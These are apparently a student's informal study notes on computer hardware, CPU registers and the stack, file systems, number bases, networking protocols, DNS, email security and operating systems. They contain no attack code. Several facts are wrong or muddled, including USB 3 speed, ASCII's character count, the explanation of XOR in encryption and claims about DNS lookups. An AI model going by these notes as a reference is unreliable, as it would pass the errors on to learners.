<Computer hardware>
	Motherboard, Processor, RAM, Storage, GPU, Input Devices, Output Devices, Power Supply Unit (PSU), Connectors, Heat Sink, Thermal Paste
	Motherboard>
		Motherboards typically come in different, but standard, sizes. PC cases usually come with holes pre-drilled for motherboards to attach to with screws.
		Motherboard sizes>
			E-ATX: Largest size (extended ATX); ATX: standard size; micro-ATX: Smaller than ATX; mini-ITX: Even smaller still.
		Most desktop computers use an ATX or E-ATX motherboard, with micro-ATX and below usually used in laptops or other small form-factor applications.

		Motherboards are often classified based on the 'socket' type with which they are compatible. 
		The socket is just a name given to the kind of connector that the CPU processor has. The CPU processor must have a socket that is compatible with the motherboard
		Buses: Motherboard allows slotted components to communicate, it uses physical connections called buses to do move data between components.
	Socket 1151 motherboards.
		
	CPU>
		This image shows a modern processor's front and back view. The front is the piece with the silver 'lid' on it, while the back view is the section with the gold connectors. The connectors are laid out according to the 'socket' specification. 
		The socket configuration of a processor allows the processor to be used in motherboards that have a compatible socket type.	
		Cores execute instructions
		Clock speed used to measure instructions completed per second
		Context Switching: Allows a single processor to perform simultaneous tasks, processor time to split between multiple components, 
		Further CPU>
			Components>
				Control unit (CU): responsible for directing electrical signals to the computer, in order to execute program instructions. 
				The Arithmetic Logic Unit (ALU): responsible for performing arithmetic and logical operations. +, - /, *; <, >, =, NOT, OR
				Registers>
					Located inside the CPU so are faster than RAM but are small
					memory registers: In a CPU with a 32-bit architecture, each memory register can hold 32 bits of data. 
					General purpose registers>
						GPR that can be split into parts>
							32-bit Intel CPU (x86): EAX, EBX, ECX, EDX
						
							'AX' register: lower 16 bits of the full 32-bit EAX register.
								'AL' register: lower 8 bits of the 'AX' register.
								'AH' register: higher 8 bits of the 'AX' register.
							EG	8 bits 	8 bits 	8 bits 	8 bits
								EBX 	EBX 	EBX 	EBX
												BX 		BX
												BH 		BL
						GPR that cant be split>
							ESP, EBP, ESI, EDI
							They can be addressed as SP, BP, SI, and DI to access the lower 16 bits, but you cannot split them further.
							ESP (Stack Pointer Register) It contains a memory address, which points to the top of the current stack frame in RAM 
							EBP is the Base Pointer. It contains a memory address, which points to the bottom of the current stack frame in RAM 
							ESI (Source Index) is typically used to hold a memory address of data when that data is being used as a source in an operation (EG memory address of data to be copied )
							EDI (Destination Index) is typically used to hold a destination memory address. (EG memory address of data to be copied over)
						Special Purpose Registers>
							Cant be used freely by programs
							EIP, also known as the 'instruction pointer' holds the memory address of the next instruction the CPU is going to execute.
						 
				The Fetch-Decode-Execute Cycle>
					The CU 'fetches' the next instruction from RAM -> CU 'decodes' the instruction and retrieves the necessary data from memory to place into the ALU ->
					 ALU 'executes' the instruction, and operates on the data provided in the previous step -> ALU stores result in memory register or RAM (so 4 steps overall)
					
				//get invalid special purpsoe registers
				//Big-mid endian
				
					
					
	
	RAM>
		Current open programs.
		Make sure that the lack of RAM is the bottleneck before adding more RAM, has to be compatible with motherboard 
		Quicker than disk, Volatile
		Types of RAM:: DDR4 (double data rate fourth generation): New; DDR3 RAM: 2007 intro; 
		Speed measured in MHz, EG DDR3-2133 RAM is DDR3 RAM with a maximum speed of 2133 MHz.
		
		Stack and heap>
			RAM is one contiguous piece of data storage, but it is separated into sections by software
				Stack>	
					When you launch a program, the instructions for that function are loaded onto the stack and then each function is assigned an area of memory called a 'stack frame' (containing local variables)
					 Right at the bottom of the stack frame will be the return pointer, When the CPU enters a function, it will save the previous value of EIP here, which can be re-loaded into EIP after a 'ret' (return) function
				Heap> 
					Unstructured area of memory that can be used to store data, slower to access than the stack but can store data here without knowing its size beforehand, 
			Instructions and data>
				when the CPU is pointed to a memory location via the instruction pointer, it treats the contents as an instruction
				when the CPU is instructed to copy data from a memory address, the contents of that memory address is treated as data since the copy data instruction expects it to be
				If you make the instruction pointer point to the bottom of a stack frame (the data section), the CPU would try to execute that data as if it were instructions (and likely crash as a result). 
				Likewise, if you try to perform an operation on a memory address that is high up in the stack frame (instructions), the CPU would treat it as data rather than an instruction, because it expects to get data.	

	hard drive>
		Size: 3.5 inch in desktop, 2.5 inch in laptops, maz capacity refers to Gb size
		Solid state: Quicker and less fragile (no moving parts) than mechanical hard disk.
		File systems>
			Drives must be formatted with a file system to determine how files are stored
			Acts as protocol for accessing and saving files to the physical storage media
			Clusters>
				Every storage device is broken down into a series of clusters, the file system determines their size 
				EG if cluster size = 32kb and files saved is 64kib, then 2 clusters are required
				A 1kb file takes a whole cluster since a cluster can only store one file, the wasted space is called slack space
				Clusters have an address
				if a file takse multiple clusters then the adjacent cluster is used, if it's full then a different cluster is used and the cluster addresses are combined,
				 if the file system uses a file allocation table then the first cluster will point at the table entry which contains the next clusters address
			Stores extra info per file including metadata, which is stored on an index which provides a list of files and their location on the disk
			If a file is deleted, then the index entry is removed and the cluster is marked as overwritable (for efficiency)
			Types of file systems>
				FAT32>
					Introduced with Windows 95. Uses a File Allocation Table to map each cluster. Doesnt support files > 4GB, doesnt store metadata (so doesnt suppport permissions and security features), suits USB
					FAT 32 vs FAT
						FAT 32 Works on drives up to 2TB nad has more efficient storage										
				exFAT> 
					file system designed for removable media (USB),  introduced in 2006,  file size limit is massive
				ntfs>
					Used by modern windows, advanced file system with many features (permissions, encryption support, shadow copies (backups)), can partly heal from data corruption, not cross-platform, proprietary
					Master File Table (MFT) entries still contain info on deleted files, 
					Index enteries use $FILE_NAME attribute to store info in an index 
						EG full file name, creation and modification time, access time, MFT change time, file size and its parent directory
						
				EXT3 and EXT4>
					Linux, introduced in 2001 (doesnt support shadow copy), EXT3 max file size is 2TB. Changes tracked in a journal, which can be used for data recovery
					EXT4 2008, massive max file size, can optionally turn off journal and has a faster disk check processor
					EXT2 is the most popular
					
				Apple proprietary file systems>
					HFS+ & APFS: HFS+ (Hierarchical File System Plus) orignally used for MAC, similar to EXT4
					APFS (Apple File System): first used in Mac OS High Sierra, it is thought that duplicate files can be stored without using additional space, with changes to one copy of a file being saved as a delta  
						
					
			
			
			

	GPU>
		The processor offloads the calculations necessary for displaying graphics on a monitor to the GPU. Sits in graphics card, contains own dedicated RAM for graphics.
	Input>
		USB (Universal Serial Bus)>
		USB A/B/C, micro A/B, mini A/B
			USB 1 - Transfer Speed: 1.5 Mbit/s
			USB 2 - Transfer Speed: 480 Mbit/s
			USB 3 - Transfer Speed: 4 Gbit/s (You can usually tell if a port is USB 3 compatible because the port will be coloured blue)
			USB 3.1 - Transfer Speed: 10 Gbit/s (You can usually tell if a port is USB 3.1 compatible because the port will be coloured turquoise)
		PS/2 older USB 
		HID: Human interface device

	Output>
		VGA:  A/V video output, there are two slots into which thumb screws on the connector connect
		DVI: Newer VGA
		HDMI: Transmit video and audio
		Standard A, dual-link B. mici C, micro D, automotive connection system 
		Display port: Very modern HDMI
		USB-C can output for some modern monitors

	Heat Sink>
		move heat from sensitive components, thermally conductive material, attach to a component with thermal paste (fills small holes), can add fan
			Motehrboard, processor, GPU
	Power supply>
		Make sure powers all components
		Power Connectors: Four pin peripheral (fans), SATA (Hard drives), ATX (20-24 pins fro the motherboard), 12V (4 pins to motherboard), PCI-E (Graphics card, 6-8 pins)
		 
	
	Other stuff>
		DVI: RGB
		The integrated graphics on Coffee Lake chips allow support for DP 1.2 to HDMI 2.0 and HDCP 2.2 connectivity.
		 When using dual link, at a refresh rate of 60Hz you can get a resolution of 2560×1600 and for intense gaming monitors
		 refreshing at 120Hz you can get 1920×1200. All modes that require more than 24 bits per pixel, or 165 MHz pixel clock frequency must use dual-link mode.
		 
		 
<Data>
	Byte formats and kibibyte formats, manipulate and convert number bases, ascii table, magic bytes
    Bits>
		1 byte is 8 bits.
		1 kilobyte (kB) is 1000 bytes.
		1 megabyte (MB) is 1000 kilobytes.
		1 gigabyte (GB) is 1000 megabytes.
		1 terabyte (TB) is 1000 gigabytes.
		 4 bits (half a byte) is called a nibble...
		 
		1 byte is 8 bits.
		1 kibibyte (KiB) is 1024 bytes.
		1 mebibyte (MiB) is 1024 kebibytes.
		1 gibibyte (GiB) is 1024 mebibytes.
		1 tebibyte (TiB) is 1024 gebibytes.

    Alternate number bases>
		Base10 decimal
		Base2 binary
		base16 hex
		base8 octal
		use notation to specify number base: 0d = denary. 0b = binary. 0x = hexadecimal.
		0d10 is 10 in denary. 0b10 is 10 in binary and 0x10 is 10 in hexadecimal.
		
    Denary
    Binary
    Hexadecimal>
		0 1 2 3 4 5 6 7 8 9 A B C D E F
		
		0d6878
		65536 	4096 	256  16  1
		0 		0 		0 	 0 	 0
		What is the largest heading that goes into 6878? It's 4096. How many times does it go into it? 1:
		65536 4096 256 	16 	1
		0 	  1    0 	0 	0
		6878 - (1 * 4096) = 2782
		What is the largest heading that goes into 2782? It's 256. How many times does it go into it? 10:
		65536 4096 256 16 1
		0 	  1    A   0  0
		2782 - (10 * 256) = 222
		What is the largest heading that goes into 222? It's 16. How many times does it go into it? 13:
		65536 4096 256 16 1
		0 	  1    A   D  0
		222 - (13 * 16) = 14
		What is the largest heading that goes into 14? It's 1. How many times does it go into it? 14:
		65536 4096 256 16 1
		0 	  1    A   D  E
		14 - (14 * 1) = 0, so we're done with the conversion:
		0d6878 = 0x1ADE
	ASCII>
		The text that is drawn on the computer screen by a computer is read from storage as a binary number. The binary number correlates to a character.
		The original ASCII was 7 bits wide, so it supported only 127 characters ((2^7) - 1 = 127). These days we actually use extended ASCII which is 8 bits and therefore supports 255 characters.
    File Headers>
		header at the beginning of the file that tells us what kind of file it is.
		Magic bytes/numbers or file signitures
		
	Boolean logic>
		Logic is calculated in the logic unit of the processor through a series of logic gates
		 Every input to the circuit is in one of two states, depending on the voltage flowing along it at the time: either 0 (low voltage, approx 0 volts) or 1 (high voltage, approx 5 volts).
		 Bugs in computer programs can stem from incorrect usage of Boolean logic.
		 //Add truth tables
		 Logic gate types>
			 AND, A && B 
			 OR, A || B
			 NOT, !A
			 NAND, !(A && B), NOR, !(A || B)
			 XOR, A or B but not both
			 XOR>
				Using XOR we end up with an information asymmetry, we lose information by virtue of this logic gate. XOR is commutative so is great for encryption algorithms
				Can use on a secret code adn plain text to generate cipher text, since XOR losses data it is dificult to get back
				The third part XORs the cipher text against the secret code to get the orginal text
			 
				 
	http://www.csgnetwork.com/binmultdivcalc.html
	https://www.binaryhexconverter.com/
	https://www.miniwebtool.com/hex-calculator/
	
	
<Networking>
	LO: Name common pieces of network hardware and explain their purpose, Explain the purpose of different types of network addresses, Explain the purpose of packets and protocols, Explain the differences between TCP and UDP.
	LAN, WAN, Ethernate cable, WiFi signals, router connects LAN to the internet
	Topologies> 
		bus, star, ring, star, mesh, token ring, tree (Multiple stars involve either a series or tertiary nodes attached to two or more secondary nodes, which are attached to the tree's primary trunk node.)
	Network Hardware>
		Switches: Connects computers on a network together. switch will receive all data on the network and decide which cable to send the data through, based on which computer the information is destined for.
		Hubs: Unsmart switch, a wireless hub can only broadcast data over radio waves, so there is no way to direct data to only one device. That means all wireless access points are actually hubs.
		Routers: connects two networks together, can offer swicth functionality but lacks ports
		NIC: Network Interface Card allows the computer to interface with a network. Ethernet and wiFi use different NICs
		Each NIC (Network Interface Card) is assigned an IP address when it connects to a network.
		
	IP addresses>
		192.168.0.77
		A private IP address is one assigned to your computer on the local network (LAN). Private IP addresses have to fall within certain ranges and are only accessible to computers on the same LAN.
		A public IP address is internet facing. In most home and small business network setups, The ability to share an IP address is handled by something called Network Address Translation (NAT)
		Each address has 4 bytes, 
		
		Network Address Translation>
			delay the problem of running out of IPv4 addresses
			router is responsible for converting the packets that come in from public IP addresses to private IP addresses and vice versa
		Internet Protocol Version 6>
			2001:0db8:0000:0000:0000:ff00:0042:8329
			 16 bytes long ( 128 bits (compared with IPv4's 32 bits), 2^128 possible IPv6 addresses )
			 With IPv6 NAT is not needed anymore, however NAT is a useful firewall, computers outside the LAN cant access you unless you set up a NAT forwarding rule at the router to allow it
		Subnets>
			Sub-network (a way of splitting up a network into segments)
			 IP address actually consists of two parts: network identifier and host identifier. These parts are variable within an IP so we need a subnet mask to tell us how big each one is. 
			  EG 255.255.0.0. Means first two bytes are network identifier. The more computers you want to connect to the larger the host identifier needs to be (255.0.0.0 ->  2^24 amount of hosts, 255.255.0.0. -> 26^16, )
				Classless Inter-Domain Routing (CIDR)>
					shorthand way of writing a subnet mask.
					 192.168.0.0, 255.0.0.0 -> 192.168.0.0/8. /x bits are used for the network identifier.
		Private IP Ranges>
			In IPv4, by common agreement, there are certain IP addresses which are private and should never be routed to the internet
			    for 10.0.0.0/8 IP addresses: 10.0.0.0 -- 10.255.255.255
				for 172.16.0.0/12 IP addresses: 172.16.0.0 -- 172.31.255.255
				for 192.168.0.0/16 IP addresses: 192.168.0.0 - 192.168.255.255
				127.0.0.1 always points back to the computer you are sending data from (localhost/loopback)
			IPv6 does not need NAT and therefore doesn't need reserved addresses in the same way that IPv4 does
				::1 is the IPv6 localhost 	
				Ipv6 cause a problem to subnets: some subnets could have more potential addresses in them than the whole of the IPv4 address range,
				 while on IPv4 you could scan the entire address range of your subnet looking for a device, that isn't practical on IPv6.
				 
	MAC Addresses>
		34:13:65:76:09:86
		//TODO Add shorthand MAC addresses
		A MAC address, or Media Access Control address (also known as a hardware address), is an address that is burned into the NIC when it is produced
		MAC addresses are used to identify computers on a local network. They enable a switch to know which cable to send info to a particular PC
		Used together with private IP
		
	Packets>
		Data is encapsulated into packets before it is transmitted over the network. The data is the payload, but also carries IP and MAC 
		packet headers include other data such as where the data is going, amongst other things.
		Max size packets depends on protocol and other facotrs, typically you will see a maximum packet size of about 1500 bytes - 65535 bytes (64 KiB).
		
	Protocols>
		A protocol is a set of rules, which governs how two or more parties interact with one another
		TCP (Transmission Control Protocol)>
			Designed for reliability
			The protocol involves a connection setup, called the TCP handshake, which prepares two computers to talk to each other. 
			After the TCP connection is done, the TCP teardown closes the connection. 
			 includes measures to re-transmit data that was lost in transit, or corrupted en route to the destination
			 comparatively slow to transmit data
			TCP Handshake>
				The computer that initiates the connection (Computer A) sends a packet with the 'SYN' (synchronise) flag, which contains a random sequence number
				EG 	Source 		Destination 	Prot 	Info
					Computer A 	Computer B 	    TCP 	63410 > 1337 [SYN] Seq=0 Len=0
				Computer B responds with the SYN and adds a ACK flag (synchronise/acknowledge), a random seq number is generated but the Ack number is the recieved seq number+1 
				EG	Source 		Destination 	Prot 	Info
					Computer B 	Computer A 		TCP 	1337 > 63410 [SYN, ACK] Seq=0 Ack=1 Len=0
				Computer A responds with just 'ACK' flag  and this packet will contain the seq number that Computer B sent, incremented by 1.
				EG  Source 		Destination 	Prot 	Info
					Computer A 	Computer B 		TCP 	63410 > 1337 [ACK] Seq=1 Ack=1 Len=0

				Summary (the first seq is random): CA -> CB: 63410 > 1337 [SYN] Seq=0 Len=0; CB -> CA: 1337 > 63410 [SYN, ACK] Seq=0 Ack=1 Len=0; CA -> CB: 63410 > 1337 [ACK] Seq=1 Ack=1 Len=0 
				By monitoring the sequence and acknowledgement numbers, either side can tell if any data is missing and can ask for it to be re-transmitted.
			TCP Transmission>
				Once the connection is set up, data can be sent
				EG Source 		Destination 	Prot 	Info
				   Computer A 	Computer B 		TCP 	63410 > 1337 [PSH, ACK] Seq=1 Ack=1 Len=12 [Data = Hello World]
				   Computer B 	Computer A 		TCP 	1337 > 63410 [ACK] Seq=1 Ack=13 Len=0
				The data sent adds up to 12 characters (Including space and \n character)
				Ack number is set to the number of bytes sent + 1, If CB doesnt send back an Ack of 13 then the packet needs to be retransmitted (During handshake and teardown we just increment Ack)
			TCP Teardown>
				The computer that wants to destroy the connection sends a 'fin' packet (finish) with the current sequence number.
				Computer B responds with an 'ack' packet, contains a seq number and an ack number which is CA's seq number +1.
				Computer B will send a 'fin/ack' packet. Contains seq number and an ack number which is CA's seq number +1 (still 14 because Computer A's sequence number didn't change).
				Computer A responds with an 'ack' packet. Contains a ack number which is CB's seq number +1.
					EG
					CA -> CB: 63410 > 1337 [FIN, ACK] Seq=13 Ack=1 Len=0
					CB -> CA: 1337 > 63410 [ACK] Seq=1 Ack=14 Len=0
					CB -> CA: 1337 > 63410 [FIN, ACK] Seq=1 Ack=14 Len=0
					CA -> CB: 63410 > 1337 [ACK] Seq=14 Ack=2 Len=0
				
				Reset: If the connection cannot be torn down gracefully, one part of the connection can terminate abruptly by sending an 'rst' (reset) packet
					
		UDP (User Datagram Protocol)> 
			Focues on speed, doesnt need a connection handsake, doesnt detect missing packets and ignores corrupted data
			Video chats,  VOIP (Voice over Internet Protocol)		
			EG
			Source 	Destination 	Proto 	Info
			Computer A 	Computer B 	UDP 	50183 > 1337 Len=6 [ data = stuff]
			Dropped packets can degrade video quality but this is quicker than waiting for missing frames
				
				
		Ports> 
			A port is a communications channel for apps running on the operating system to listen to. 
			When connecting to a website you send IP of server and port the server is listening on. Allows the web server to seperate multiple communications
			 0 to 65535 (2^16)
			 The TCP protocol has its own port range, which is separate from other protocols. For example, if you have TCP port 80 and UDP port 80, they may have the same number, but they are different ports altogether. 
		
		Other protocols>
			Application level protocols>
				HTTP>
					EG Computer A sends a get request with headers containing other info. -> Webserver responds with HTTP/1.0 200 OK and then the file
					request types>
						GET: Accessing a website and so asking to retrieve a file fro mthe server.
						HEAD: Asks to receive the resposne header of a resource
						POST: Send data without expecting data to be sent back
						PUT: A PUT request is used to ask the web server to store the data sent in the request at the path requested. EG PUT 'h​ttps://some-fake-domain.fake/about.html' would store the data as about.html (if it exists it is overwritten)
						DELETE: A DELETE request deletes a specified resource
					//TODO look up other infomation the requests can hold (User agent, conetent type)
					response>
						HTTP response consists of two parts: the response header (metadata) and the response body (data retrieved)
						Meta data examples: response length, date, name of the server, type of web server being used
			 Internet Control Message Protocol (ICMP)>
			 	Designed to transmit error messages and operational information between hosts on a network	
				used in network devices, not typically used in end-user apps (an exception is the ping command)
				OSI level 3, generally the payload is 8 bytes long
				Packet consists of a type and a code
				EG What ping uses to determine if a website is alive and gauge latency
					type 8 code 0 (echo response packet) expects the target to send back a echo response packet (Type 0 Code 0)
				EG 
					type 11 code 0 packet (ICMP time exceeded packet) 
					a router sends this to a system that sent a packet with a expired TLL (the number of hops the packet can travel before it is considered lost and gets discarded) 	
				
				https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#header_code
			Dynamic Host Configuration Protocol (DHCP)>
				DHCP server present on the network to assign network configuration settings to each host automatically when they join the network
				The DHCP knows what IP addresses it has assigned and so duplicate addresses are unlikely (hence only 1 server should be used)
				Can be configured with static IP addresses for certain devices
				Great opportunity to intercept traffic
			Open Systems Interconnection (OSI) Model>	
				 a way of describing the way computers communicate with each other over a network
				 theoretical model, so not all protocols will fit neatly into the seven layers
				 Some will span layers, EG TCP is a layer four protocol, but it handles sessions, which is in layer five.
				 Layers>
				 	Summary>
						Layer 7: Application -> L6: Presentation -> L5: Session
						L4: Transport -> L3: Network -> L2: Data Link -> L1: Physical
					start at the top and work your way down the model operating on the data at each layer 
					{See The7LayersOfOSI.png}
					In depth>
						Application> 
							data is encapsulated into packets, occurs by adding headers to the data
							EG HTTP GET as the web browser will form the request necessary for displaying a page or submitting a form.
							DNS, SMTP, POP, FTP, HTTP
						Presentation> 
							XML, JSON
							formatting data in a way that the intended recipient can understand, converted to data and then encrypted 
						Session> 
							handles opening, closing and managing connections between computers
							TCP is a transport layer protocol, which doesn't respect the OSI model so it doesnt fall under the session layer
						Transport> 
							end-to-end connections between computers on a network
							TCP, UDP header gets added to the packet
						Network> 
							responsible for routing the packet over the internet
							IP header is added to the packet
						Data link>
							responsible for encoding and decoding packets into bits
							destination and source MAC address is added to the packet (in the form of the Ethernet frame, or wireless, or Bluetooth), indicating which network card on the network the packet is going to next. 
						Physical Layer>
							responsible for converting the packet into electrical signals
					At the target location the reverse occurs
					 	The physical layer converts electrical signals into bits.
						The data link layer removes the Ethernet frame (for example).
						The network layer removes the IP header.
						The transport layer removes the TCP or UDP header.
					Sometimes the user is called layer 8, and the physical link/medium where the data unit is a bit is called layer 0
			TCP/IP Model>
				another theoretical model designed to show how computers communicate over the network.
				    Layer summary>
						L4: Application, L3: Transport, L2: Internet, L1: Network Access
					In depth>
						Application Layer: Contains application, presentation, session layers from the OSI model
						Transport and Internet Layers: Copy of direct OSI layers
						Network access layer: Data and physical OSI layers
					
					EG> 
						HTTP/1.1 GET /
						Browser has requested a sites index page
							Application and transport layers
								TCP header added, which consists of: source port and destination port (80, 443), then SYN number and ACK numbers
								So the original data (HTTP/1.1 GET /) is now behind the TCP header
							Internet layer
								IP header is added: version (4 or 6), source and destination IP, packet size, other stuff
							Data link layer 
								DLL protocol implemented, EG an ethernet frame which frames the packet since it has a header and a footer,  
								consists of: source and destination MAC address, and ethernet protocol stuff
							Physical layer
								Electrical impluses sent over the network
							Packet goes through the reverse process at the destination, then the web server recevies the get request and responses with a index page in HTML (encapsulated as a packet) 
			Address Resolution Protocol (APR)>
				An Ethernet frame requires a source MAC address and a destination MAC address, but it doesnt know the destination MAC address
				EG	
					Computer A: 192.168.0.5, Computer B: 192.168.0.10
					CA sends a broadcast request (request to everyone on the local network) asking for the MAC address of 192.168.0.10 and CB will send back its MAC address
					CA stores that mapping in a ARP table which caches results
				When sending data over the internet your computer will know the IP is not on the local network (using the subnet mask) so it will send the data to the targets router which will use ARP or ARP cache to get its MAC	
									
				
	Web languages>
		HTML>
			HTML is a markup language so its a way of displaying data
			HTML on its own should be static		
		Javascript>
			Programming language that runs in the browser, can be client and server-side, but mostly client.
				
		PHP>
			Server side programming language, so results are sent as a response
			The server side implementation allows data sent to be different for every user.
				<p>The result of 2 + 2 is <?php echo(2 + 2); ?></p>	
			FTP>
				EG 
				FTP Server: 220 pyftpdlib based ftpd ready. -> CA: OPTS UTF8 ON -> FTP Server: 530 Log in with USER and PW first. -> Computer A: USER someguy -> 
				FTP Server: 331 Username ok, send PW -> Computer A: PASS somePW -> FTP Server: 230 Login successful.
				
				Clear text transmission and that acts as a back and forth converdsation (HTTP tries to handle everything in one go)
	Web servers>
		web server will send HTML back to the browser, which will use that HTML to render the web page.
		Types> 
			Generic> 
				these are multi-purpose applications that serve files which exist in a certain folder on the OS
				Uses web root (root folder that contains files needed to run the website), including an index file (Path:"/"), can access any files by visiting the site that the web server is configured to serve.
			Custom>
				these are typically programs that are purpose-built to serve a particular site. EG NodeJS
				 the routes usually need to be programmed into the software. In other words, the code of the web server will define what happens when a user tries to access a certain path or route
		HTTP web server listen on port 80
		Encrypted HTTPS listen on port 443
	
	Cookies and local storage>
		Cookies>
			tiny file which a web server can create on a visitor's computer
			One use is to store a unique identifier called a session ID, which can be used to authenticate automatically when visitng a website
			Cookies have an expiry date, which is set by the site when it creates the cookie.
			Only the domain that gave you a cookie can ask for that cookie back so most sites dont know which sites you commonly visit. Though ads are embedded from the advertising company's web server,
			 so they can give a cookie through an ad to identify you and can ask for it back
		Local storage>
			Sites can also store files (up to 5MB) in your browsers local storage, you can be tracked here
			
	Emails>
		Email is text sent from one email server to another and placed in a folder called your inbox. That inbox then syncs with your computer (or is accessed through a webmail client like the Gmail web interface).
		Limited encryption, recent STARTTLS transit encryption which is similar to HTTPS
		Create email -> email transmitted to outgoing mail server -> OMS looks up responsible incoming mail server for target domain 
		-> transmits email -> The incoming mail server will look up the email account and save the email in the correct inbox and format
		-> The recipient's email client will sync their inbox, and they will see the unread email come into their inbox.
		SMTP to send emails
		POP3/IMAP/Exchange protocols used to sync the inbox
		Common mail server softare: Microsoft Exchange, Postfix, Sendmail, Qmail
		Email protocols>
			SMTP (Simple Mail Transfer Protocol)>
				connection-oriented text-based protocol
				Each connection can be re-used to send multiple emails (SMTP transactions)
				Commands>
					MAIL: Establishes the return path (return address), bounce address (where to send an error message if the mail delivery fails), sender, amongst other things.
					RCPT: Establishes the address of the recipient. You can use the RCPT command multiple times to establish multiple recipients.
					DATA: Signifies the start of the message text. DATA parts: Email header contains email metadata, email body: contents of the email
				 Doesnt use authentication. So after log in, can put what you want in the  MAIL FROM (be anyone)
				 
			POP3, IMAP and Exchange>
				POP3>
					Oldest. Email is stored on the email server until you sync with the email server. After sync it is deleted
					Effective if limited email server space, risk losing emails, cant sync between devices
				IMAP (Internet Message Access Protocol)>	
					messages remain on the server until the user specifically deletes them
					IMAP server can track state on each email (EG read or unread).
					Sync devices, can use server to search for messages 
				Microsoft Exchange>
					More server software than protocol
					originally supported microsofts MAPI though now it supports IMAP, POP3 and EAS (Exchange Active Sync).
					Restricted to windows server
				
		Email Spoofing, SPF and DKIM>
			Email spoofing>
				SMTP is old so has faults
				People can perform email forging by changing the FROM address, as you only need to athenticate to the STMP server once
				Attempts to solve the problem>	
					SPF (Sender Policy Framework)>
						In the DNS configuration for your domain, you add a text record that lists all the IP addresses of mail servers allowed to send emails from your domain.
						 When a mail server receives an email that says it is from your domain, it will look up the SPF record for your domain and compare the IP address of the mail server that delivered the email 		
						However many organisations no longer host their own email (they outsource it), EG if outsourced to google any gmail account can bypass SPF
					DKM>
						Using asymmetrical cryptography, you put a public key in DNS settings text record
						When your email server sends an email legitimately, it will sign that email with your private key. When the receiving server gets the email, it will validate that signature using the public key in your DNS records.
						Effective as many email hosts can have separate private keys for every domain they host for
	
	DNS server (Domain Name System)>
		translates domain name (for humans) into an IP address (for computers)
		Router uses DHCP (Dynamic Host Configuration Protocol) to tell network computers to use pre-setup DNS server (if it has one)
		If a sepearate server provides DHCP one needs to be disabled to avoid clashes
		Type domain name into browser -> computer sends request to DNS server -> DNS server gives matching IP -> browser sends HTTP request
		
		TLD (Top level domain)>	
			The DNS system is hierarchical; no one server has all the answers about every domain on the internet. 
			So one server gives more info to the next DNS to query
			TLD is in the domain name EG google.com -> .com, this indicates the first DNS server to query first (which can then look for the name server with the right IP)
		
		Authoritative name servers>
			A name server that is authoritative for a domain is one that controls the mapping between the domain name and the 
			IP address. EG domainName.com and we want IP 192.168.0.6, we go to the name server which is authoritative for that domain (the one .com directs us too)
			and we edit the config to add the mapping domainName.com -> 192.168.0.6, any other name servers now needs to query our ANS because it has the final say on where the domain points 											
										
		Caching>
			There are exceptions to the above ANS example thanks to caching
			If a name server makes a query and discovers the IP address a domain points to, it can cache the result for a time for stop the amount of requests needed, 
			 it will still periodically erase the cache so that if the name server configuration is updated, it will reflect the new address in a reasonable time,
		
		Forward and reverse lookups>
			Forward lookup involves translating a domain name into an IP address.
			A reverse lookup translates IP -> domain, though there is no authoritative name server for IP addresses
			Convert IP address to a domain name: EG 192.168.0.1 -> 1.0.168.192.in-addr.arpa
			By performing a DNS query on this domain, we can look up any domains which are linked to that IP address (these need to be configured for reverse DNS by adding a particular DNS pointer record to the authoritative name server.
			
		Recursive & Iterative Lookups>
			DNS is a hierarchical protocol, which means you almost never get the answer you are looking for on the first query.
			With a recursive lookup: Ask the DNS server a question and if the DNS server doesn't know, it will ask another DNS server and so on until it has the answer and then it passes on the answer to you (outdated, uncommon method) 
			Iterative lookup>
				If DNS server doesn't know the answer, it will respond with the IP address of a DNS server that does know, then you ask the next DNS server, it will answer or send you to the next DNS to ask 
				This gives the host most of the work reducing the pressure on DNS servers.
				
		DNS records>
			When you are configuring the authoritative DNS server for a particular domain, you will need to add DNS records for that domain 
			Record types>
				A (Address Mapping): This is the key record that maps a domain name to an IPv4 address.
				AAAA (IPv6 Address Mapping): The equivalent of an A record, but for IPv6 addresses.
				CNAME (Canonical Name): Used for creating an alias of a domain name. For example, if you wanted your domain to redirect to google.com
				MX (Mail Exchange): specifies the mail server which is responsible for handling email for that domain. When an external user sends an email to your domain, their mail server will perform a DNS lookup for the 'MX' record to find the IP address of the mail server to send the email to.
				NS (Name Server): points to the authoritative name server for the domain in question. Usually, the NS records are configured separately on the domain registrar's systems to point to the DNS server of your choice.
				PTR (Pointer): used for reverse DNS lookups. It ties an IP address to a domain name in the format: 1.0.168.192.in-addr.arpa PTR notarealdomain.fake
				TXT (text): is used for storing any other textual data associated with the domain name. This is used a lot in SPF and DKIM for mail servers.

	
	Google>
		Crawlers visit a page, then it finds all the links and makes an index of all the words on that page. The crawler will then follow the links on the page to the next page and do the same there. 
		Eventually, the crawler will have indexed every publicly accessible page on the internet.
		 if many pages that contain the keyword all link to one page, that page is most likely to be an authority on that search term.
		 Use as few keywords as possible for more results
		 
		Google keywords:
			Restrict searches to a certain webstie: 	site:bbc.co.uk hacker
			Search for PDF fiels with fun in them: 	   filetype: pdf fun  
		Wildcard operator: Wildcard can match any word
			EG "The internet is a series of *""
		Quotes: Searches for the entire string as a keyword rather than each individual item
			EG "usign quotes in google"	
		Calucalotr: EG sqrt 10, calc
		Google dorks:  Find content that people never intended to be put online
			EG     Unsecured security cameras, Passwords, Vulnerable software, private Documents
		Troubleshooting>
			Focus queries on specific keywords more likely to give an answer 
			EG macrosoft letters crash open -> macrosoft letters log location -> macrosoft letters error 42
		Alt search engines>
			Google, Bing, Yahoo, DuckDuckGo, archive.org
	
		//TODO Get more useful google keywords
			
			
<OS>
	An operating system is software that runs on the computer which manages how the computer operates.
	Kernel>
		First part of the OS code to be loaded, and has complete control over the computer. 
		Control sensitive functionality so resids in protected memoery
		Responsibilities: EG Loading of new programs, handling input and output between peripherals, and managing access to the hardware's shared resources	
		User -> Applications -> OS (kernel) -> Hardware (CPU memory devices)
	Processes>
		A series of actions or steps taken in order to achieve a particular end
		A process is created on a computer when a program is requested to be loaded. The computer will load the code in the program
		 and will create a process which contains all of the necessary information for execution
	Interrupts>
		An interrupt is a signal that is sent to the CPU, which alerts the CPU to a task requiring its immediate attention. An interrupt will halt the CPU and cause it to begin executing the corresponding interrupt handler.
		A hardware interrupt is generated by some sort of physical hardware
		Software inturrupts EG to request privalliges to do something
	BIOS (Basic Input Output System)>
		a program stored on the motherboard
		it is the first program that is loaded and initialises the hardware ready to load the bootloader.
		UEFI (Unified Extensible Firmware Interface). UEFI is the successor to BIOS, more versatile and secure
	Bootloaders>
